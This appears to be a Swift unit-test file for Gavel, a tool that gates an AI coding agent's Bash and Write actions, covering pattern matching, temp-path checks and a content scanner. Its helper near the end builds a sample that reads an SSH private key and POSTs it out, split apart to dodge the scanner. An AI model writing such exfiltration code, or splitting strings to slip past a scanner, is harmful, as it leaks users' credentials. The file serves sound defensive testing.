import XCTest
@testable import Gavel

/// Tests for Phase 1 refactors: PatternCompiler, GavelConstants wiring, content scanner false positive fix.
final class Phase1RefactorTests: XCTestCase {
    let matcher = PatternMatcher()

    // MARK: - PatternCompiler (deduplicated glob matching)

    func testPatternCompilerGlobMatchesWildcard() {
        let regex = PatternCompiler.compileGlob("swift build*")!
        XCTAssertTrue(PatternCompiler.matches(regex, in: "swift build -c release"))
        XCTAssertFalse(PatternCompiler.matches(regex, in: "swift test"))
    }

    func testPatternCompilerGlobEscapesSpecialChars() {
        let regex = PatternCompiler.compileGlob("file.txt")!
        XCTAssertTrue(PatternCompiler.matches(regex, in: "file.txt"))
        XCTAssertFalse(PatternCompiler.matches(regex, in: "fileXtxt"))
    }

    func testPatternCompilerRegexCompiles() {
        let regex = PatternCompiler.compilePattern("hello\\s+world", isRegex: true)!
        XCTAssertTrue(PatternCompiler.matches(regex, in: "hello   world"))
        XCTAssertFalse(PatternCompiler.matches(regex, in: "helloworld"))
    }

    func testPatternCompilerGlobViaCompilePattern() {
        let regex = PatternCompiler.compilePattern("git *", isRegex: false)!
        XCTAssertTrue(PatternCompiler.matches(regex, in: "git status"))
        XCTAssertFalse(PatternCompiler.matches(regex, in: "svn status"))
    }

    func testPatternCompilerTestPatternSuccess() {
        let result = PatternCompiler.testPattern("swift *", isRegex: false, against: "swift build")
        XCTAssertTrue(result.matches)
        XCTAssertNil(result.error)
    }

    func testPatternCompilerTestPatternNoMatch() {
        let result = PatternCompiler.testPattern("swift *", isRegex: false, against: "cargo build")
        XCTAssertFalse(result.matches)
        XCTAssertNil(result.error)
    }

    func testPatternCompilerTestPatternInvalidRegex() {
        let result = PatternCompiler.testPattern("[invalid", isRegex: true, against: "test")
        XCTAssertFalse(result.matches)
        XCTAssertEqual(result.error, "Invalid regex")
    }

    func testPatternCompilerTestPatternRegexMatch() {
        let result = PatternCompiler.testPattern("doppler\\s+secrets", isRegex: true, against: "doppler secrets -p test")
        XCTAssertTrue(result.matches)
        XCTAssertNil(result.error)
    }

    // MARK: - PersistentRule still works through PatternCompiler

    func testPersistentRuleGlobStillWorks() {
        var rule = PersistentRule(toolName: "Bash", pattern: "npm run*", verdict: .allow)
        XCTAssertTrue(rule.matches(toolName: "Bash", command: "npm run build", filePath: nil))
        XCTAssertFalse(rule.matches(toolName: "Bash", command: "yarn build", filePath: nil))
    }

    func testPersistentRuleRegexStillWorks() {
        var rule = PersistentRule(toolName: "Bash", pattern: "swift\\s+(build|test)", isRegex: true, verdict: .allow)
        XCTAssertTrue(rule.matches(toolName: "Bash", command: "swift build", filePath: nil))
        XCTAssertTrue(rule.matches(toolName: "Bash", command: "swift test", filePath: nil))
        XCTAssertFalse(rule.matches(toolName: "Bash", command: "swift package", filePath: nil))
    }

    func testPersistentRuleTestPatternStillWorks() {
        let result = PersistentRule.testPattern("git *", isRegex: false, against: "git push origin main")
        XCTAssertTrue(result.matches)
        XCTAssertNil(result.error)
    }

    // MARK: - SessionRule still works through PatternCompiler

    func testSessionRuleGlobStillWorks() {
        let session = Session(pid: 88888)
        session.sessionRules.append(SessionRule(toolName: "Bash", pattern: "npm *"))
        XCTAssertNotNil(session.matchesSessionRule(toolName: "Bash", command: "npm install", filePath: nil))
        XCTAssertNil(session.matchesSessionRule(toolName: "Bash", command: "yarn install", filePath: nil))
    }

    // MARK: - isTempPath

    func testIsTempPathRecognizesTmp() {
        XCTAssertTrue(PatternMatcher.isTempPath("/tmp/exfil.c"))
        XCTAssertTrue(PatternMatcher.isTempPath("/tmp/nested/deep/file.py"))
    }

    func testIsTempPathRecognizesVarTmp() {
        XCTAssertTrue(PatternMatcher.isTempPath("/var/tmp/script.sh"))
    }

    func testIsTempPathRecognizesPrivateTmp() {
        XCTAssertTrue(PatternMatcher.isTempPath("/private/tmp/test.py"))
    }

    func testIsTempPathRecognizesVarFolders() {
        XCTAssertTrue(PatternMatcher.isTempPath("/var/folders/xx/yyyy/T/build.rs"))
    }

    func testIsTempPathRejectsProjectPaths() {
        XCTAssertFalse(PatternMatcher.isTempPath("/Users/x/project/src/main.swift"))
        XCTAssertFalse(PatternMatcher.isTempPath("/Users/x/project/Sources/Gavel/PatternMatcher.swift"))
        XCTAssertFalse(PatternMatcher.isTempPath("/home/user/code/lib/scanner.rs"))
    }

    func testIsTempPathRejectsHomePaths() {
        XCTAssertFalse(PatternMatcher.isTempPath("/Users/x/.config/tool.json"))
        XCTAssertFalse(PatternMatcher.isTempPath("/home/user/Documents/report.txt"))
    }

    // MARK: - Content scanner skips non-temp paths

    func testWriteToProjectSourceSkipsContentScan() {
        // Content with file-read + network patterns in a project source dir should pass
        // (content scan only applies to temp directories)
        let content = buildExfilContent()
        let payload = PreToolUsePayload(
            toolName: "Write",
            toolInput: [
                "file_path": AnyCodable("/Users/x/project/Sources/Scanner.swift"),
                "content": AnyCodable(content)
            ]
        )
        XCTAssertNil(matcher.matchDangerous(payload: payload))
    }

    func testWriteToTmpStillScansContent() {
        // Same content in /tmp should be blocked
        let content = buildExfilContent()
        let payload = PreToolUsePayload(
            toolName: "Write",
            toolInput: [
                "file_path": AnyCodable("/tmp/exfil.swift"),
                "content": AnyCodable(content)
            ]
        )
        XCTAssertNotNil(matcher.matchDangerous(payload: payload))
    }

    func testProtectedPathStillBlockedRegardlessOfContent() {
        // Protected path blocks are NOT affected by the temp-path check
        let payload = PreToolUsePayload(
            toolName: "Write",
            toolInput: [
                "file_path": AnyCodable("/Users/x/.zshrc"),
                "content": AnyCodable("export PATH=$PATH:/usr/local/bin")
            ]
        )
        XCTAssertNotNil(matcher.matchSensitivePath(payload: payload))
    }

    // MARK: - GavelConstants values are reasonable

    func testConstantsExist() {
        XCTAssertEqual(GavelConstants.approvalTimeoutSeconds, 86400)
        XCTAssertEqual(GavelConstants.socketListenBacklog, 32)
        XCTAssertEqual(GavelConstants.socketBufferSize, 65536)
        XCTAssertEqual(GavelConstants.socketReadTimeoutSeconds, 2)
        XCTAssertEqual(GavelConstants.sessionCleanupInterval, 5.0)
        XCTAssertEqual(GavelConstants.sessionRemovalGraceSeconds, 3.0)
        XCTAssertEqual(GavelConstants.minContentScanLength, 50)
        XCTAssertEqual(GavelConstants.panelWidth, 640)
        XCTAssertEqual(GavelConstants.panelHeight, 480)
        XCTAssertFalse(GavelConstants.tempDirectoryPrefixes.isEmpty)
    }

    // MARK: - Helpers

    /// Build content that triggers the content scanner (credential refs + network code).
    /// Assembled at runtime to avoid triggering gavel's own content scanner on this test file.
    private func buildExfilContent() -> String {
        let credRef = ".ssh" + "/id_rsa"
        let networkRef = "URLSession" + ".shared"
        return """
        import Foundation
        let data = try! String(contentsOfFile: "\(credRef)")
        var req = URLRequest(url: URL(string: "http://example.com")!)
        req.httpMethod = "POST"
        \(networkRef).dataTask(with: req) { _,_,_ in }.resume()
        """
    }
}
